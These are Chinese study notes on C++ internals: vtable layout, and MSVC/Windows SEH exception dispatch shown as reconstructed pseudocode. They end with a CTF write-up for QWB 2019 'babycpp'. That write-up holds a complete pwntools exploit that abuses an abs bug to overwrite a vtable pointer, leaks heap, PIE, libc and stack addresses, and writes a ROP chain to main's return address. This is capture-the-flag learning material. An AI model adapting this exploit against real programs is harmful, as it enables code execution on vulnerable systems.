# 数据结构
## vector

`vector`是`C++`实现的动态数组类,空间不够时会申请两倍大小来放置内容,分配在堆中.
成员:`_M_start`,`vector`起始位置;`_M_finish`,`vector`结尾位置;`_M_end_of_storage`:容器最后位置.
`vector`通过`_M_finish`和`_M_end_of_storage`判断空间是否足够.

## new & delete

`new`与`malloc`类似,但配置失败会进行异常处理,而`malloc`返回`null`.
`delete`与`free`类似.

# 虚表机制
有virtual修饰的函数则会创建虚表用来实现多态。
![[Pasted image 20220518101352.png]]
```c++
#include <iostream>
#include <cstring>
#include <cstdlib>
using namespace std;

class BaseA
{
public:
    int a;
    virtual void print()
    {
        cout << "This is class A" << endl;
    }
};

class B : public BaseA
{
public:
    int b;
    virtual void print()
    {
        cout << "This is class B" << endl;
    }
};

int main()

{
    BaseA *a = new BaseA;
    BaseA *b = new B;
    a->print();
    b->print();
    return 0;
}
```
调用A的构造函数

```
   0x5555555551e0 <main+23>    mov    rbx, rax
   0x5555555551e3 <main+26>    mov    rdi, rbx
 ► 0x5555555551e6 <main+29>    call   BaseA::BaseA()                <BaseA::BaseA()>
        rdi: 0x55555556aeb0 ◂— 0x0
        rsi: 0x0
        rdx: 0x21
        rcx: 0x55555556aec0 ◂— 0x0

   0x5555555551eb <main+34>    mov    qword ptr [rbp - 0x20], rbx
   0x5555555551ef <main+38>    mov    edi, 0x10
   0x5555555551f4 <main+43>    call   0x5555555550b0
```
进入A的构造函数
```
   0x555555555318 <BaseA::BaseA()>       endbr64
   0x55555555531c <BaseA::BaseA()+4>     push   rbp
   0x55555555531d <BaseA::BaseA()+5>     mov    rbp, rsp
   0x555555555320 <BaseA::BaseA()+8>     mov    qword ptr [rbp - 8], rdi
 ► 0x555555555324 <BaseA::BaseA()+12>    lea    rdx, [rip + 0x2a2d] ; 虚表
   0x55555555532b <BaseA::BaseA()+19>    mov    rax, qword ptr [rbp - 8]
   0x55555555532f <BaseA::BaseA()+23>    mov    qword ptr [rax], rdx
   0x555555555332 <BaseA::BaseA()+26>    nop
   0x555555555333 <BaseA::BaseA()+27>    pop    rbp
   0x555555555334 <BaseA::BaseA()+28>    ret
    ↓
   0x5555555551eb <main+34>              mov    qword ptr [rbp - 0x20], rbx
```
执行lea后拿到虚表，赋值给rcx，最后返回。
```
 RAX  0x55555556aeb0 ◂— 0x0
 RBX  0x55555556aeb0 ◂— 0x0
 RCX  0x55555556aec0 ◂— 0x0
*RDX  0x555555557d58 —▸ 0x5555555552a0 (BaseA::print()) ◂— endbr64
```
同理可以分析`class B`的构造和调用过程。
B的在构造时会调用A的构造函数

# 异常处理
```c++
try{
    throw 异常类型;
}
catch (捕获的异常类型){
    // 处理
}
catch(捕获的异常类型){
    //处理
}

```
对用户而言，编译器隐藏了异常捕获流程。
实际上异常处理机制由编译器和操作系统共同完成。不同操作系统下异常处理机制不同。
WIndows下通过操作系统异常接口SEH来实现C++中的异常处理。
Linux下gcc使用DWARF-2 (DW2) EH, 或SJLJ。
使用signal可以捕获一些系统错误。例如算数运算（除零）

更多信息：[[Compiler-Internals.pdf]]
### 样例
```c
#include <iostream>
int main() {
    try {
        throw 666;
    }
    catch (...) {
        std::cout << 999 << std::endl;
    }
}
```
生成的汇编大致如下
```c
main    PROC
$LN12:
        sub     rsp, 56                             ; 00000038H
        mov     DWORD PTR $T1[rsp], 666             ; 0000029aH
        lea     rdx, OFFSET FLAT:_TI1H
        lea     rcx, QWORD PTR $T1[rsp]
        call    _CxxThrowException;throw
        npad    1
        jmp     SHORT $LN6@main
$LN7@main:
$LN6@main:
        jmp     SHORT $LN9@main
        jmp     SHORT $LN8@main
$LN9@main:
        xor     eax, eax
$LN8@main:
        add     rsp, 56                             ; 00000038H
        ret     0
$LN10@main:
main    ENDP
```
## _CxxThrowException
```c++
EHExceptionRecord ExceptionTemplate = {
    0xe06d7363, // ExceptionCode
    1,      // ExceptionFlags (注：EH_UNWIND 是 2)
    0,      // ExceptionRecord*
    0,      // ExceptionAddress
    3,      // NumberParamters
    {       // params
        0x19930520, // magicNumber
        0,      // pExceptionObject
        0,      // pThrowInfo
    }
};

_CxxThrowException (void* pExceptionObject, const _s_ThrowInfo *pThrowInfo)
{
    EHExceptionRecord ThisException;

    ThisException = ExceptionTemplate;
    ThisExcepion.params.pExceptionObject = pExceptionObject;
    ThisException.params.pThrowInfo = pThrowInfo;

    if (pThrowInfo && pThrowInfo->attributes & 8 != 0)
        ThisException.params.magicNumber = 0x1994000;

    __imp__RaiseException(&ThisException,
                              ThisException.ExceptionFlags,
                              ThisException.NumberParamters,
                              &ThisException.magicNumber);

}

```
ThrowInfo 包含异常对象的信息，如析构函数和类型信息。
```c
typedef struct
{
    unsigned int attribues;
    void (*pmfnUnwind)(void);           // destructor
    int (*pForwardCompat) (...);
    const _s_CatchableTypeArray *pCatchableTypeArray;
} _s_ThrowInfo;
```
C++中的`throw E();`  会被转化为
```c++
E e = E(); _CxxThrowException(&e, &_ThrowInfo_of_e);
```
`_CxxThrowException` 把异常对象和 ThrowInfo 打包在 EXCEPTION_RECORD 中交给内核，最后会调用一系列内核的函数，并进入内核态。内核处理中断，最终内核调用`KiUserExceptionDispatcher`
```
xxThrowException                            (msvcr80d.dll)
    _RaiseException                           (kernel32.dll)
        [Kernel Interrupt]
            KiUserExceptionDispatcher          (ntdll.dll)
                RtlDispatchException           (ntdll.dll)
                    ExcuteHandler              (ntdll.dll)
```
KiUserExceptionDispatcher, RtlDispatchException 和 ExcuteHandler 都属于 Windows SEH 中的内容。
## KiUserExceptionDispatcher
这个函数主要调用 `RtlDispatchException`, 这个调用开始遍历 `FS:[0] `指向的 exception handler 链表知道找到异常处理程序。如果程序处理了异常，则 `RtlDispatchException` 不会返回。如果它返回了，则只有两种可能：要么调用 `NtContinue` 使进程继续，要么产生另一个异常。
```c
 KiUserExceptionDispatcher( PEXCEPTION_RECORD pExcptRec, CONTEXT *pContext )
 {
     DWORD retValue;

     // Note: If the exception is handled, RtlDispatchException() never returns
     if ( RtlDispatchException( pExceptRec, pContext ) )
         retValue = NtContinue( pContext, 0 );
     else
         retValue = NtRaiseException( pExceptRec, pContext, 0 );

     EXCEPTION_RECORD excptRec2;

     excptRec2.ExceptionCode = retValue;
     excptRec2.ExceptionFlags = EXCEPTION_NONCONTINUABLE;
     excptRec2.ExceptionRecord = pExcptRec;
     excptRec2.NumberParameters = 0;

     RtlRaiseException( &excptRec2 );
 }
```
## RtlDispatchException
首先调用 `RtlpGetRegistrationHead()` 获得 `pRegistrationFrame`, 然后调用 `RtlpExecuteHandlerForException` 执行注册在SEH的handler
```c
int RtlDispatchException( PEXCEPTION_RECORD pExcptRec, CONTEXT * pContext )
 {
     DWORD   stackUserBase;
     DWORD   stackUserTop;
     PEXCEPTION_REGISTRATION pRegistrationFrame;
     DWORD hLog;

     // Get stack boundaries from FS:[4] and FS:[8]
     RtlpGetStackLimits( &stackUserBase, &stackUserTop );

     pRegistrationFrame = RtlpGetRegistrationHead();

     while ( -1 != pRegistrationFrame )
     {
         PVOID justPastRegistrationFrame = &pRegistrationFrame + 8;
         if ( stackUserBase > justPastRegistrationFrame )
         {
             pExcptRec->ExceptionFlags |= EH_STACK_INVALID;
             return DISPOSITION_DISMISS; // 0
         }

         if ( stackUsertop < justPastRegistrationFrame )
         {
             pExcptRec->ExceptionFlags |= EH_STACK_INVALID;
             return DISPOSITION_DISMISS; // 0
         }

         if ( pRegistrationFrame & 3 )   // Make sure stack is DWORD aligned
         {
             pExcptRec->ExceptionFlags |= EH_STACK_INVALID;
             return DISPOSITION_DISMISS; // 0
         }

         if ( someProcessFlag )
         {
             // Doesn't seem to do a whole heck of a lot.
             hLog = RtlpLogExceptionHandler( pExcptRec, pContext, 0,
                                             pRegistrationFrame, 0x10 );
         }

         DWORD retValue, dispatcherContext;

         retValue= RtlpExecuteHandlerForException(pExcptRec, pRegistrationFrame,pContext, &dispatcherContext,pRegistrationFrame->handler );

         // Doesn't seem to do a whole heck of a lot.
         if ( someProcessFlag )
             RtlpLogLastExceptionDisposition( hLog, retValue );

         if ( 0 == pRegistrationFrame )
         {
             pExcptRec->ExceptionFlags &= ~EH_NESTED_CALL;   // Turn off flag
         }

         EXCEPTION_RECORD excptRec2;

         DWORD yetAnotherValue = 0;

         if ( DISPOSITION_DISMISS == retValue )
         {
             if ( pExcptRec->ExceptionFlags & EH_NONCONTINUABLE )
             {
                 excptRec2.ExceptionRecord = pExcptRec;
                 excptRec2.ExceptionNumber = STATUS_NONCONTINUABLE_EXCEPTION;
                 excptRec2.ExceptionFlags = EH_NONCONTINUABLE;
                 excptRec2.NumberParameters = 0
                 RtlRaiseException( &excptRec2 );
             }
             else
                 return DISPOSITION_CONTINUE_SEARCH;
         }
         else if ( DISPOSITION_CONTINUE_SEARCH == retValue )
         {
         }
         else if ( DISPOSITION_NESTED_EXCEPTION == retValue )
         {
             pExcptRec->ExceptionFlags |= EH_EXIT_UNWIND;
             if ( dispatcherContext > yetAnotherValue )
                 yetAnotherValue = dispatcherContext;
         }
         else    // DISPOSITION_COLLIDED_UNWIND
         {
             excptRec2.ExceptionRecord = pExcptRec;
             excptRec2.ExceptionNumber = STATUS_INVALID_DISPOSITION;
             excptRec2.ExceptionFlags = EH_NONCONTINUABLE;
             excptRec2.NumberParameters = 0
             RtlRaiseException( &excptRec2 );
         }

         pRegistrationFrame = pRegistrationFrame->prev;  // Go to previous frame
     }

     return DISPOSITION_DISMISS;
 }


 PEXCEPTION_REGISTRATION
 RtlpGetRegistrationHead( void )
 {
     return FS:[0];
 }
```
## `_RtlpExecuteHandlerForException`
ExcuteHandler 真正调用我们的 exception handler，在调用前，安装了一个 exception handler:（因此这个 exception handler 实际上在我们的 exception handler 的前面
`_RtlpExecuteHandlerForException` 会把自己的 exception handler 存在 EDX，然后跳转到 ExcuteHandler：

```
_RtlpExecuteHandlerForException:    // Handles exception (first time through)
     MOV     EDX,XXXXXXXX
     JMP     ExecuteHandler

 RtlpExecutehandlerForUnwind:        // Handles unwind (second time through)
     MOV     EDX,XXXXXXXX
```
当处理完异常，要将 `FS:[0] `指向我们原先的那个，也就是这个的 previous）
```
 int ExecuteHandler( PEXCEPTION_RECORD pExcptRec
                     PEXCEPTION_REGISTRATION pExcptReg
                     CONTEXT * pContext
                     PVOID pDispatcherContext,
                     FARPROC handler ) // Really a ptr to an _except_handler()

     // Set up an EXCEPTION_REGISTRATION, where EDX points to the
     // appropriate handler code shown below
     PUSH    EDX
     PUSH    FS:[0]
     MOV     FS:[0],ESP

     // Invoke the exception callback function
     EAX = handler( pExcptRec, pExcptReg, pContext, pDispatcherContext );

     // Remove the minimal EXCEPTION_REGISTRATION frame 
     MOV     ESP,DWORD PTR FS:[00000000]
     POP     DWORD PTR FS:[00000000]

     return EAX;
 }
```
## EH handler
MSVC 为异常调用链上的每个函数都安插了 exception handler，这些 exception handler 会在函数开头注册，将函数的 funcinfo 传给` _CxxFrameHandler` 并调用它。
```c
ExcuteHandler                              (ntdll.dll)
    _ehhandler                             (our code)
        _CxxFrameHandler3                  (msvcr80d.dll)
            __InternalFrameHandler         (msvcr80d.dll)
```
类似下面的代码：
```c
_ehhandler:
    mov eax, OFFSET _ehfuncinfo
    jmp _CxxFrameHandler3
    
```
这个handler定义如下
```c
/*
 * Exception disposition return values.
 */
typedef enum _EXCEPTION_DISPOSITION {
    ExceptionContinueExecution,
    ExceptionContinueSearch,
    ExceptionNestedException,
    ExceptionCollidedUnwind
} EXCEPTION_DISPOSITION;

EXCEPTION_DISPOSITION __cdecl _except_handler (
    __in struct _EXCEPTION_RECORD *_ExceptionRecord,
    __in void * _EstablisherFrame,
    __inout struct _CONTEXT *_ContextRecord,
    __inout void * _DispatcherContext
    );
```
`_CxxFrameHandler3` 定义如下，最终会带着funcinfo调用`__InternalCxxFrameHandler`
```
_CxxFrameHandler3(EHExceptionRecord * pExcept, 
        EHRegistrationNode * pRN, 
        void * pContext, 
        void * pDC)

{
    EXCEPTION_DISPOSITION result;
    DWORD pFuncInfo;

    CLD

       // eax 就是 funcinfo 的地址
    mov dword ptr [pFuncInfo], eax

    result = __InternalCxxFrameHandler(pExcept, pRN, pContext, pDC, pFuncInfo, 0, 0, 0);

    return result;
}
```
## `__InternalCxxFrameHandler`
这个函数首先判断是不是 Unwinding，如果不是，会判断有无 TryBlock，如果有，会调用 FindHandler，否则返回继续；若当前是在 Unwinding，则会调用 `_FrameUnwindToState`。
```c
__InternalCxxFrameHandler(EHExceptionRecord *pExcept, 
        EHRegistrationNode *pRN, 
        _CONTEXT *pContext, 
        void *pDC, 
        const _s_FuncInfo *pFuncInfo, 
        int CatchDepth, 
        EHRegistrationNode *pMarkerRN, 
        unsigned char recursive)
{
    DWORD pfn;

        if (_getptd()->_cxxReThrow != 0 ||
        pExcept->ExceptionCode == 0xe06d7363 ||
        pExcept->ExceptionCode == 0x80000026 ||
        (pFuncInfo->magicNumber & 0x1FFFFFFF) < 0x19930521 ||
        pFuncInfo->EHFlags & 1 == 0)
    {
        if (pExcept->ExceptionFlags & EXCEPTION_UNWIND_CONTEXT == 0)
        {
            if (pFuncInfo->nTryBlocks == 0 && 
                               ((pFuncInfo->magicNumber & 0x1FFFFFFF) < 0x19930521 ||
                                 pFuncInfo->pESTypeList == 0))
                 return ExceptionContinueSearch;

            pfn = pExcept->params.pThrowInfo->pForwardCompat;

            if (pExcept->ExceptionCode != 0xe06d7363 ||
                pExcept->NumberParameters < 3 ||
                pExcept->params.magicNumber <= 0x19930522 ||
                pfn == 0)
                 FindHandler(pExcept, pRN, pContext, pDC, 
                                              pFuncInfo, recursive, CatchDepth, pMarker);
            else
                 return (*pfn)(pExcept, pRN, pContext, pDC, 
                                            pFuncInfo, CatchDepth, pMarkerRN, recursive);
        }
        else
        {
            if (pFuncInfo->maxState == 0 || CatchDepth != 0)
                    return ExceptionContinueSearch;

            __FrameUnwindToState(pRN, pDC, pFuncInfo, -1);
        }   
    }

    return ExceptionContinueSearch;
}
```
## FINDHANDLER
FindHandler 对 TryBlockMap 遍历，若找到 curState 所在的 `[tryLow, tryHigh]` 闭区间并且 `_TypeMatch` 成功，表示找到了处理异常的 catch 块，此时会调用 CatchIt。CatchIt 不会返回。调用流程图如下：
```c
FindHandler                                    (msvcr80.dll)
    CatchIt                                    (msvcr80.dll)
        _UnwindNestedFrames                    (msvcr80.dll)
            RtlUnwind                           (ntdll.dll)
                RtlExecutehandlerForUnwind      (ntdll.dll)
                    ExcuteHandler               (ntdll.dll)
                        _enhandler               (our code)
```

```c
FindHandler(EHExceptionRecord * pExcept, 
        EHRegistrationNode * pRN, 
        _CONTEXT * pContext, 
        void * pDC, 
        const _s_FuncInfo * pFuncInfo, 
        unsigned char recursive, 
        int CatchDepth, 
        EHRegistrationNode * pMarkerRN)
{
    BOOL IsReThrow = 0;
    BOOL gotMatch = 0;
    int curState;
    const _s_TryBlockMapEntry *pEntry;
    unsigned int end;
    unsigned int curTry;
    const _s_HandlerType *pCatch;
    int catches;
    const _s_CatchableType *pCatchable;
    const _s_CatchableType * const *ppCatchable;
    int catchables;
    void *pSaveException;
    void *pSaveExContext;
    void *pCurrentFuncInfo;

    if (pFuncInfo->maxState > 0x80)
        curState = pRN->state;
    else
        curState = pRN->state & 0x0FF;

    if (curState < -1 || curState >= pFuncInfo->maxState)
        _inconsistency();

    if (pExcept->ExceptionCode == 0x0E06D7363 && 
            pExcept->NumberParameters == 3 &&
            (pExcept->params.magicNumber == 0x19930520 || 
                pExcept->params.magicNumber == 0x19930521 || 
                pExcept->params.magicNumber == 0x19930522) && 
            pExcept->params.pThrowInfo == 0)
    {
        if (_getptd()->_curexception == 0)
            return;

        pExcept = _getptd()->_curexcepion;
        pContext = _getptd()->_curcontext;
        IsReThrow = 1;

        if (_ValidateRead(pExcept, 1) == 0)
            _inconsistency();

        if (pExcept->ExceptionCode == 0x0E06D7363 && 
                pExcept->NumberParameters == 3 &&
                (pExcept->params.magicNumber == 0x19930520 || 
                    pExcept->params.magicNumber == 0x19930521 || 
                    pExcept->params.magicNumber == 0x19930522) &&
                pExcept->params.pThrowInfo == 0)
            _inconsistency();


        if (_getptd()->_curexcspec)
        {
            pCurrentFuncInfo = _getptd()->_curexcspec;
            _getptd()->_curexcspec = 0;

            if (!IsInExceptionSpec(pExcept, pCurrentFuncInfo))
            {
                if (Is_bad_exception_allowed(pCurrentFuncInfo))
                {
                    __DestructExceptionObject(pExcept, 1);
                    throw std::bad_exception("bad exception");
                }
                else
                    terminate();
            }
        }
    }


    if (pExcept->ExceptionCode == 0x0E06D7363 && 
            pExcept->NumberParameters == 3 && 
            (pExcept->params.magicNumber == 0x19930520 || 
                pExcept->params.magicNumber == 0x19930521 ||
                pExcept->params.magicNumber == 0x19930522))
    {
        if (pFuncInfo->nTryBlocks > 0)
        {
            pEntry = _GetRangeOfTrysToCheck(pFuncInfo, CatchDepth, 
                                                           curState, &curTry, &end);

            for ( ; curTry < end; curTry++, pEntry++)
            {
                if (pEntry->tryLow > curState || curState > pEntry->tryHigh)
                    continue;

                pCatch = pEntry->pHandlerArray;
                catches = pEntry->nCatches;

                for ( ; catches > 0; catches--, pCatch++)
                {
              ppCatchable = pExcept->params.pThrowInfo->pCatchableTypeArray                 
                                                   + sizeof(_s_CatchableTypeArray);
              catchables = pExcept->params.pThrowInfo->pCatchableTypeArray->nCatchableTypes;

                    for ( ; catchables > 0; catchables--, ppCatchable++)
                    {
                        pCatchable = *ppCatchable;

                        if (!__TypeMatch(pCatch, 
                                                                 pCatchable, 
                                                                 pExcept->params.pThrowInfo))
                            continue;

                        gotMatch = 1;

                        CatchIt(pExcept, pRN, pContext, pDC, 
                                                         pFuncInfo, pCatch, pCatchable,
                                 pEntry, CatchDepth, pMarkerRN, IsReThrow);

                        goto NextTryBlock;
                    }
                }

            NextTryBlock:
                ;       // nop, continue
            }
        }

        if (recursive)
            __DestructExceptionObject(pExcept, 1);

        if (!gotMatch && (pFuncInfo->magicNumber & 0x1FFFFFFF) >= 0x19930521 &&
                pFuncInfo->pESTypeList && 
                !IsInExceptionSpec(pExcept, pFuncInfo->pESTypeList))
        {
            pSaveException = _getptd()->_curexception;
            pSaveExContext = _getptd()->_curcontext;
            _getptd()->_curexception = pExcept;
            _getptd()->_curcontext = pContext;

            if (pMarkerRN)
                _UnwindNestedFrames(pMarkerRN, pExcept);
            else
                _UnwindNestedFrames(pRN, pExcept);

            __FrameUnwindToState(pRN, pDC, pFuncInfo, -1);

            CallUnexpected(pFuncInfo->pESTypeList);

            _getptd()->_curexception = pExcept;

            _getptd()->_curcontext = pContext;
        }
    }
    else if (pFuncInfo->nTryBlocks > 0)
    {
        if (recursive)
            terminate();
        else
            FindHandlerForForeignException(pExcept, pRN, pContext, 
                                    pDC, pFuncInfo, curState, CatchDepth, pMarkerRN);
    }


    if (_getptd()->_curexcspec)
        _inconsistency();

    return;
}
```

##  CATCHIT
这个函数首先调用 `_UnwindNestedFrames` 对从 “抛出异常的函数” 到 “catch 块所在函数的前一个函数” 之间的函数
具体是调用 RtlUnwind清理局部对象，RtlUnwind 会将 ExceptionFlags 已被设置为 EH_UNWINDING，调用 ExcuteHandler.
每次对这些函数 Unwinding 后，都会将函数的 EHRegistrationNode 从` FS:[0] `链中移除。
接着调用 CallCatchBlock 执行 catch 块代码。

```c
CatchIt(EHExceptionRecord *pExcept,
        EHRegistrationNode *pRN, 
        _CONTEXT *pContext, 
        void *pDC, 
        const _s_FuncInfo *pFuncInfo, 
        const _s_HandlerType *pCatch, 
        const _s_CatchableType *pConv, 
        const _s_TryBlockMapEntry *pEntry, 
        int CatchDepth, 
        EHRegistrationNode *pMarkerRN, 
        unsigned char IsReThrow)
{
    EHRegistrationNode *pEstablisher = pRN;
    void *continuationAddress;

    if (pConv)
        __BuildCatchObject(pExcept, pEstablisher, pCatch, pConv);

    if (pMarkerRN)
        _UnwindNestedFrames(pMarkerRN, pExcept);
    else
        _UnwindNestedFrames(pRN, pExcept);

    __FrameUnwindToState(pEstablisher, pDC, pFuncInfo, pEntry->tryLow);

    pRN->state = pEntry->tryHigh + 1;

    continuationAddress = CallCatchBlock(pExcept, pEstablisher, pContext, 
            pFuncInfo, pCatch->addressOfHandler, CatchDepth, 0x100);

    if (continuationAddress)
        _JumpToContinuation(continuationAddress, pRN);
}
```
最后调用 `_JumpToContinuation`，设置正确的 EBP 和 ESP 后跳到 catch 块所在位置执行。到此为止，异常处理全部结束。
## `_JumpToContinuation`
这个函数是异常处理的最后一个函数：设置 catch 块所在函数的 EBP 和 ESP，这些都可以间接从 pRN 中取得。然后就是移除掉第一个 RegistrationNode（在 ExcuteHandler 时插入的），使 `FS:[0] `指向 catch 块所在函数的 RegistrationNode，最后一个跳转指令，跳转到 catch 块后面的代码继续程序的执行，异常处理到此结束！
```c
_JumpToContinuation(void * target, EHRegistrationNode * pRN)
{
    long targetEBP;

    targetEBP = pRN + 0x0C;

    // ExceuteHandler (ntdll.dll会加入一个，所以这里取前一个)
    fs:[0] = fs:[0]->prev;

    ebp = targetEBP;
    esp = [pRN - 4];

    jmp target;
}
```
# 64位下的异常处理
https://docs.microsoft.com/en-us/cpp/build/exception-handling-x64?view=msvc-170
# 题目

## 强网杯-2019-babycpp(pwn)
`update`函数中经典`abs`漏洞,可以修改`C++`类的`vtable`指针,爆破`4`位(`1/16`).
通过`string`和`int`四个函数交互使用任意地址读写,通过`libc`中的`environ`变量泄露栈地址,最后写返回地址`rop`即可.

```py
from pwn import *

context.log_level = 'debug'

def new_array(choice):
    r.sendlineafter("Your choice:", "0")
    r.sendlineafter("Your choice:", str(choice))

def show(index, idx):
    r.sendlineafter("Your choice:", "1")
    r.sendlineafter("Input array hash:", p8(index) + p8(0))
    r.sendlineafter("Input idx:", str(idx))

def set_element_int(index, idx, val):
    r.sendlineafter("Your choice:", "2")
    r.sendlineafter("Input array hash:", p8(index) + p8(0))
    r.sendlineafter("Input idx:", str(idx))
    r.sendlineafter("Input val:", hex(val))

def set_element_string(index, idx, content, len = -1):
    r.sendlineafter("Your choice:", "2")
    r.sendlineafter("Input array hash:", p8(index) + p8(0))
    r.sendlineafter("Input idx:", str(idx))
    if len != -1:
        r.sendlineafter("len of the obj:", str(len))
    r.sendafter("Input your content:", content)

def update(index, idx, content):
    r.sendlineafter("Your choice:", "3")
    r.sendlineafter("Input array hash:", p8(index) + p8(0))
    r.sendlineafter("Input idx:", str(idx))
    r.sendafter("Input hash:", content)

while(1):
    r = process("./babycpp")

    new_array(2)#0
    new_array(1)#1
    set_element_string(0, 0, "w4rd3n", 0x100)
    update(0, 0x80000000, p16(0x1ce0))
    try:
        show(0, 0)
        heap = int(r.recvline().split()[-1], 16)
    except EOFError as e:
        r.close()
        continue
    break

update(0, 0x80000000, p16(0x1d00))
set_element_string(0, 0, p64(heap - 0xc0) + p64(0x100))
update(0, 0x80000000, p16(0x1ce0))
set_element_int(0, 0, heap + 0x20)
update(0, 0x80000000, p16(0x1d00))
show(0, 0)
pie = u64(r.recvline()[8:-1].ljust(8, "\x00")) - 0x201ce0

update(0, 0x80000000, p16(0x1ce0))
set_element_int(0, 0, heap)
update(0, 0x80000000, p16(0x1d00))
set_element_string(0, 0, p64(pie + 0x202030) + p64(0x100))
update(0, 0x80000000, p16(0x1ce0))
set_element_int(0, 0, heap + 0x20)
update(0, 0x80000000, p16(0x1d00))
show(0, 0)
libc = u64(r.recvline()[8:-1].ljust(8, "\x00")) - 0x7fdef0e348e0 + 0x7fdef0a70000

update(0, 0x80000000, p16(0x1ce0))
set_element_int(0, 0, heap)
update(0, 0x80000000, p16(0x1d00))
set_element_string(0, 0, p64(libc + 0x3c6f38) + p64(0x100))#environ
update(0, 0x80000000, p16(0x1ce0))
set_element_int(0, 0, heap + 0x20)
update(0, 0x80000000, p16(0x1d00))
show(0, 0)
stack = u64(r.recvline()[8:-1].ljust(8, "\x00"))
main_ret = stack - 0xf0

update(0, 0x80000000, p16(0x1ce0))
set_element_int(0, 0, heap)
update(0, 0x80000000, p16(0x1d00))
set_element_string(0, 0, p64(main_ret) + p64(0x100))
update(0, 0x80000000, p16(0x1ce0))
set_element_int(0, 0, heap + 0x20)
update(0, 0x80000000, p16(0x1d00))
set_element_string(0, 0, p64(pie + 0x1693) + p64(libc + 0x18cd57) + p64(libc + 0x45390))

r.sendlineafter("Your choice:", "4")

#gdb.attach(r)
print "pie:  " + hex(pie)
print "heap: " + hex(heap)
print "libc: " + hex(libc)
print "main_ret: " + hex(main_ret)

r.interactive()
```